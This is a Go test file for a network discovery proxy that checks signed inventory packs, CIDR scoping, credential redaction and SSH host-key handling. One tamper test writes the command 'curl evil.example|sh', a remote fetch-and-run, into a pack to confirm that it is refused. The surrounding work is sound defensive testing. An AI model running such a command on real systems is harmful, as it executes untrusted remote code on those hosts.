package discovery

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/knownhosts"

	"nudgebee/forager/pkg/proxy"
)

func newTestProxy(t *testing.T, cfg map[string]any, creds map[string]string) (*Proxy, *bytes.Buffer) {
	t.Helper()

	var logBuf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	p := New(logger)
	if err := p.Configure(cfg, creds); err != nil {
		t.Fatalf("configuring proxy: %v", err)
	}
	return p, &logBuf
}

func packPubKeyB64(t *testing.T) (string, ed25519.PrivateKey) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatalf("generating pack key: %v", err)
	}
	return base64.StdEncoding.EncodeToString(pub), priv
}

// writePackDir writes a signed pack where the proxy expects to find it. Tests
// go through the same path production does: packs are read from disk, never
// supplied by the request.
func writePackDir(t *testing.T, body string, priv ed25519.PrivateKey, version int) string {
	t.Helper()
	dir := t.TempDir()
	name := fmt.Sprintf("linux-inventory-v%d.yaml", version)
	if err := os.WriteFile(filepath.Join(dir, name), []byte(signPack(t, body, priv)), 0o600); err != nil {
		t.Fatalf("writing pack: %v", err)
	}
	return dir
}

// SSH credentials are optional: a sweep-only datasource needs none, and
// demanding them would force an operator to invent credentials that are never
// used. But a username with no auth method is a mistake, not a choice.
func TestConfigure_CredentialsOptionalButCoherent(t *testing.T) {
	sweepOnly := New(slog.New(slog.DiscardHandler))
	if err := sweepOnly.Configure(map[string]any{"allowed_cidrs": []any{"10.0.1.0/24"}}, map[string]string{}); err != nil {
		t.Fatalf("sweep-only datasource rejected for having no ssh credentials: %v", err)
	}
	if got := sweepOnly.Actions(); !containsAction(got, "discovery_sweep") {
		t.Errorf("actions = %v, want discovery_sweep", got)
	}
	if got := sweepOnly.Actions(); containsAction(got, "discovery_inventory") {
		t.Errorf("actions = %v, want no inventory without credentials", got)
	}

	half := New(slog.New(slog.DiscardHandler))
	if err := half.Configure(map[string]any{}, map[string]string{"username": "x"}); err == nil {
		t.Fatal("configure accepted a username with no auth method")
	}
}

// The set of actions a datasource can serve depends on what was configured,
// and is reported so the server can route work to a datasource that can do
// it rather than finding out when an action fails.
func TestActions_ReflectConfiguration(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)

	full, _ := newTestProxy(t, map[string]any{
		"allowed_cidrs":   []any{"10.0.1.0/24"},
		"pack_public_key": pubB64,
		"pack_dir":        writePackDir(t, validBody, priv, 3),
		"ldap":            map[string]any{"host": "dc.corp.local", "base_dn": "dc=corp,dc=local"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	for _, want := range []string{"discovery_sweep", "discovery_ldap", "discovery_inventory"} {
		if !containsAction(full.Actions(), want) {
			t.Errorf("actions = %v, want %s", full.Actions(), want)
		}
	}

	noPack, _ := newTestProxy(t, map[string]any{
		"allowed_cidrs": []any{"10.0.1.0/24"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})
	if containsAction(noPack.Actions(), "discovery_inventory") {
		t.Errorf("actions = %v, want no inventory without a pack key", noPack.Actions())
	}
}

func containsAction(actions []string, want string) bool {
	for _, a := range actions {
		if a == want {
			return true
		}
	}
	return false
}

// A pack we cannot verify must not run. Without a key configured there is no
// trust root, so every pack is untrusted.
func TestHandleInventory_RefusesWithoutPackKey(t *testing.T) {
	_, priv := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{"pack_dir": writePackDir(t, validBody, priv, 3)}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":              []any{"10.0.1.5"},
			"content_pack_version": 3,
		},
	})
	if err == nil {
		t.Fatal("inventory ran without a pack verification key")
	}
	if !strings.Contains(err.Error(), "pack public key") {
		t.Errorf("error = %q, want it to name the missing key", err)
	}
}

func TestHandleInventory_RefusesTamperedPack(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)

	// A pack edited on disk after signing must not run.
	dir := t.TempDir()
	tampered := strings.Replace(signPack(t, validBody, priv), "rpm -qa", "curl evil.example|sh", 1)
	if err := os.WriteFile(filepath.Join(dir, "linux-inventory-v3.yaml"), []byte(tampered), 0o600); err != nil {
		t.Fatalf("writing pack: %v", err)
	}

	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64, "pack_dir": dir}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": 3},
	})
	if err == nil {
		t.Fatal("tampered pack was executed")
	}
}

// Scope is server-configured; a target outside it is reported as a result
// rather than silently dropped or quietly collected.
func TestHandleInventory_RejectsOutOfScopeTargets(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{
		"pack_public_key": pubB64,
		"pack_dir":        writePackDir(t, validBody, priv, 3),
		"allowed_cidrs":   []any{"10.0.1.0/24"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":              []any{"192.168.99.5"},
			"content_pack_version": 3,
		},
	})
	if err != nil {
		t.Fatalf("inventory failed: %v", err)
	}

	var out InventoryResponse
	if err := json.Unmarshal([]byte(resp.Data), &out); err != nil {
		t.Fatalf("parsing response: %v", err)
	}
	if len(out.Targets) != 1 {
		t.Fatalf("targets = %d, want 1", len(out.Targets))
	}
	if out.Targets[0].Status != StatusError {
		t.Errorf("status = %s, want error for out-of-scope target", out.Targets[0].Status)
	}
	if !strings.Contains(out.Targets[0].Error, "allowed_cidrs") {
		t.Errorf("error %q does not explain the scope rejection", out.Targets[0].Error)
	}
}

// The response carries the pack version so the server can correlate results
// with the collector semantics that produced them.
func TestHandleInventory_ReportsPackVersion(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{
		"pack_public_key": pubB64,
		"pack_dir":        writePackDir(t, validBody, priv, 3),
		"allowed_cidrs":   []any{"10.0.1.0/24"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":              []any{"192.168.99.5"}, // out of scope: no dialing needed
			"content_pack_version": 3,
		},
	})
	if err != nil {
		t.Fatalf("inventory failed: %v", err)
	}

	var out InventoryResponse
	if err := json.Unmarshal([]byte(resp.Data), &out); err != nil {
		t.Fatalf("parsing response: %v", err)
	}
	if out.ContentPackVersion != 3 {
		t.Errorf("content_pack_version = %d, want 3", out.ContentPackVersion)
	}
}

// Credentials must never reach logs or the action response: the response
// travels to the cloud, and logs are commonly shipped off-box.
func TestHandleInventory_DoesNotLeakCredentials(t *testing.T) {
	const secret = "sup3rs3cr3t-p4ssw0rd"

	pubB64, priv := packPubKeyB64(t)
	p, logBuf := newTestProxy(t, map[string]any{
		"pack_public_key":      pubB64,
		"pack_dir":             writePackDir(t, validBody, priv, 3),
		"allowed_cidrs":        []any{"10.0.1.0/24"},
		"dial_timeout_seconds": 1,
		"host_timeout_seconds": 2,
	}, map[string]string{"username": "nudgebee-ro", "password": secret})

	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":              []any{"10.0.1.5", "192.168.99.5"},
			"content_pack_version": 3,
		},
	})
	if err != nil {
		t.Fatalf("inventory failed: %v", err)
	}

	if strings.Contains(resp.Data, secret) {
		t.Error("credential appeared in the action response")
	}
	if strings.Contains(logBuf.String(), secret) {
		t.Error("credential appeared in the logs")
	}
}

// The security of this module rests on one invariant: no command reaches a
// host unless it came from a pack whose signature verified. This test pins
// that invariant against future refactors — the paths into execution are
// handleInventory -> resolvePack -> verifyPack, and every one of them must
// refuse rather than degrade.
// The security of this module rests on one invariant: no command reaches a
// host unless it came from a pack read off local disk whose signature
// verified. This pins that invariant against future refactors — every way a
// pack can fail to verify must refuse rather than degrade, and a request must
// never be able to supply pack content itself.
func TestHandleInventory_NoUnverifiedCommandPath(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)
	otherPubB64, _ := packPubKeyB64(t)

	unsignedDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(unsignedDir, "linux-inventory-v3.yaml"), []byte(validBody), 0o600); err != nil {
		t.Fatalf("writing pack: %v", err)
	}

	cases := []struct {
		name   string
		cfg    map[string]any
		params map[string]any
	}{
		{
			"no pack key configured",
			map[string]any{"pack_dir": writePackDir(t, validBody, priv, 3)},
			map[string]any{"content_pack_version": 3},
		},
		{
			"unsigned pack on disk",
			map[string]any{"pack_public_key": pubB64, "pack_dir": unsignedDir},
			map[string]any{"content_pack_version": 3},
		},
		{
			"pack signed by another key",
			map[string]any{"pack_public_key": otherPubB64, "pack_dir": writePackDir(t, validBody, priv, 3)},
			map[string]any{"content_pack_version": 3},
		},
		{
			"version not present in pack_dir",
			map[string]any{"pack_public_key": pubB64, "pack_dir": writePackDir(t, validBody, priv, 3)},
			map[string]any{"content_pack_version": 99},
		},
		{
			"no pack_dir configured",
			map[string]any{"pack_public_key": pubB64},
			map[string]any{"content_pack_version": 3},
		},
		{
			// Requests select a pack; they cannot carry one. An inline body
			// must not be honoured even when validly signed.
			"inline pack body is not accepted",
			map[string]any{"pack_public_key": pubB64},
			map[string]any{"content_pack": signPack(t, validBody, priv)},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, _ := newTestProxy(t, tc.cfg, map[string]string{
				"username": "nudgebee-ro", "password": "x",
			})

			params := map[string]any{"targets": []any{"10.0.1.5"}}
			for k, v := range tc.params {
				params[k] = v
			}

			if _, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
				Action: "discovery_inventory",
				Params: params,
			}); err == nil {
				t.Fatalf("commands would have executed without a verified on-disk pack: %s", tc.name)
			}
		})
	}
}

// A version that mismatches what the pack declares must be refused: it would
// otherwise mislabel results and make server-side correlation wrong.
func TestHandleInventory_RefusesVersionMismatch(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)

	dir := t.TempDir()
	// File says v7, pack body declares v3.
	if err := os.WriteFile(filepath.Join(dir, "linux-inventory-v7.yaml"), []byte(signPack(t, validBody, priv)), 0o600); err != nil {
		t.Fatalf("writing pack: %v", err)
	}

	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64, "pack_dir": dir}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": 7},
	})
	if err == nil {
		t.Fatal("accepted a pack whose declared version differs from the one requested")
	}
	if !strings.Contains(err.Error(), "mismatch") {
		t.Errorf("error = %q, want it to name the version mismatch", err)
	}
}

func TestHandleInventory_ValidatesParams(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{
		"pack_public_key": pubB64,
		"pack_dir":        writePackDir(t, validBody, priv, 3),
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	cases := []struct {
		name   string
		params map[string]any
	}{
		{"no targets", map[string]any{"content_pack_version": 3}},
		{"empty targets", map[string]any{"targets": []any{}, "content_pack_version": 3}},
		{"non-string targets", map[string]any{"targets": []any{42}, "content_pack_version": 3}},
		{"no pack version", map[string]any{"targets": []any{"10.0.1.5"}}},
		{"zero pack version", map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": 0}},
		{"negative pack version", map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": -1}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
				Action: "discovery_inventory",
				Params: tc.params,
			}); err == nil {
				t.Fatalf("accepted invalid params: %s", tc.name)
			}
		})
	}
}

func TestHandleRequest_UnknownAction(t *testing.T) {
	pubB64, _ := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	if _, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{Action: "discovery_sweep"}); err == nil {
		t.Fatal("accepted an action this module does not implement")
	}
}

// HealthCheck reports configuration validity: there is no single endpoint to
// probe when the datasource's target is an entire network segment.
func TestHealthCheck(t *testing.T) {
	pubB64, _ := packPubKeyB64(t)

	// Nothing configured at all: cannot serve any action.
	unconfigured := New(slog.New(slog.DiscardHandler))
	if err := unconfigured.HealthCheck(context.Background()); err == nil {
		t.Error("unconfigured proxy reported healthy")
	}

	// Scope but no credentials is a legitimate sweep-only datasource.
	sweepOnly, _ := newTestProxy(t, map[string]any{
		"allowed_cidrs": []any{"10.0.1.0/24"},
	}, map[string]string{})
	if err := sweepOnly.HealthCheck(context.Background()); err != nil {
		t.Errorf("sweep-only datasource reported unhealthy: %v", err)
	}

	// Fully configured for inventory.
	_, priv := packPubKeyB64(t)
	ready, _ := newTestProxy(t, map[string]any{
		"pack_public_key": pubB64,
		"pack_dir":        writePackDir(t, validBody, priv, 3),
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})
	if err := ready.HealthCheck(context.Background()); err != nil {
		t.Errorf("configured proxy reported unhealthy: %v", err)
	}
}

// Customers who can supply host keys get real verification; a bad path must
// fail configuration loudly rather than silently falling back to accepting
// any key.
func TestConfigure_KnownHostsFile(t *testing.T) {
	dir := t.TempDir()
	khPath := filepath.Join(dir, "known_hosts")

	pub, _, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatalf("generating host key: %v", err)
	}
	sshPub, err := ssh.NewPublicKey(pub)
	if err != nil {
		t.Fatalf("converting key: %v", err)
	}
	line := knownhosts.Line([]string{"10.0.1.15:22"}, sshPub)
	if err := os.WriteFile(khPath, []byte(line+"\n"), 0o600); err != nil {
		t.Fatalf("writing known_hosts: %v", err)
	}

	p := New(slog.New(slog.DiscardHandler))
	if err := p.Configure(map[string]any{"known_hosts_file": khPath}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	}); err != nil {
		t.Fatalf("configuring with known_hosts: %v", err)
	}

	missing := New(slog.New(slog.DiscardHandler))
	err = missing.Configure(map[string]any{"known_hosts_file": filepath.Join(dir, "nope")}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})
	if err == nil {
		t.Fatal("configure accepted an unreadable known_hosts_file instead of failing")
	}
}

func TestConfigDefaults(t *testing.T) {
	cfg := Config{}
	applyConfigDefaults(&cfg)

	if cfg.Port != defaultPort {
		t.Errorf("port = %d, want %d", cfg.Port, defaultPort)
	}
	if cfg.Concurrency != defaultConcurrency {
		t.Errorf("concurrency = %d, want %d", cfg.Concurrency, defaultConcurrency)
	}

	over := Config{Concurrency: maxConcurrency * 10}
	applyConfigDefaults(&over)
	if over.Concurrency != maxConcurrency {
		t.Errorf("concurrency = %d, want it clamped to %d", over.Concurrency, maxConcurrency)
	}
}

// A bare address in allowed_cidrs is a single-host network. Treated as a
// hostname instead, a target given by name that resolves to it would never
// match, since name resolution is only compared against the network list.
func TestParseAllowedCIDRs_BareIPBecomesSingleHostNetwork(t *testing.T) {
	p := New(slog.New(slog.DiscardHandler))
	if err := p.parseAllowedCIDRs([]string{"10.0.1.5", "10.0.2.0/24", "db.corp.local"}); err != nil {
		t.Fatalf("parsing: %v", err)
	}

	if len(p.allowedNets) != 2 {
		t.Fatalf("networks = %d, want 2 (the bare IP plus the CIDR)", len(p.allowedNets))
	}
	if len(p.allowedHosts) != 1 || p.allowedHosts[0] != "db.corp.local" {
		t.Errorf("hosts = %v, want only the hostname", p.allowedHosts)
	}

	if !p.isTargetAllowed("10.0.1.5") {
		t.Error("bare IP in allowed_cidrs did not match itself as a target")
	}
	if p.isTargetAllowed("10.0.1.6") {
		t.Error("a bare IP allowlist entry matched a neighbouring address")
	}
}

func TestParseAllowedCIDRs_BareIPv6(t *testing.T) {
	p := New(slog.New(slog.DiscardHandler))
	if err := p.parseAllowedCIDRs([]string{"2001:db8::1"}); err != nil {
		t.Fatalf("parsing: %v", err)
	}
	if len(p.allowedNets) != 1 {
		t.Fatalf("networks = %d, want 1", len(p.allowedNets))
	}
	if !p.isTargetAllowed("2001:db8::1") {
		t.Error("bare IPv6 address did not match itself")
	}
}

// Scope checks resolve hostnames, so doing them in sequence would block the
// handler for the sum of every lookup before a single host was contacted.
func TestPartitionTargetsByScope_ChecksConcurrently(t *testing.T) {
	p, _ := newTestProxy(t, map[string]any{
		"allowed_cidrs": []any{"10.0.1.0/24"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	// Names in a reserved TLD: guaranteed not to resolve, so each costs a
	// full resolver round trip.
	targets := make([]string, 60)
	for i := range targets {
		targets[i] = fmt.Sprintf("host-%d.invalid", i)
	}

	start := time.Now()
	allowed, rejected := p.partitionTargetsByScope(context.Background(), targets, 30)
	elapsed := time.Since(start)

	if len(allowed) != 0 {
		t.Errorf("allowed = %v, want none (no name resolves into scope)", allowed)
	}
	if len(rejected) != len(targets) {
		t.Errorf("rejected = %d, want %d", len(rejected), len(targets))
	}
	// Sequential resolution of 60 names would take far longer than this even
	// with a fast resolver; the bound is loose to stay stable in CI.
	if elapsed > 20*time.Second {
		t.Errorf("scope check took %s — looks sequential rather than concurrent", elapsed)
	}
}

// Order must survive the concurrent check, so results stay comparable run to
// run and a caller can correlate them with what it asked for.
func TestPartitionTargetsByScope_PreservesOrder(t *testing.T) {
	p, _ := newTestProxy(t, map[string]any{
		"allowed_cidrs": []any{"10.0.1.0/24"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	targets := []string{"10.0.1.1", "192.168.1.1", "10.0.1.2", "192.168.1.2", "10.0.1.3"}
	allowed, rejected := p.partitionTargetsByScope(context.Background(), targets, 4)

	wantAllowed := []string{"10.0.1.1", "10.0.1.2", "10.0.1.3"}
	if len(allowed) != len(wantAllowed) {
		t.Fatalf("allowed = %v, want %v", allowed, wantAllowed)
	}
	for i := range wantAllowed {
		if allowed[i] != wantAllowed[i] {
			t.Errorf("allowed[%d] = %s, want %s", i, allowed[i], wantAllowed[i])
		}
	}

	wantRejected := []string{"192.168.1.1", "192.168.1.2"}
	for i := range wantRejected {
		if rejected[i].Host != wantRejected[i] {
			t.Errorf("rejected[%d] = %s, want %s", i, rejected[i].Host, wantRejected[i])
		}
	}
}
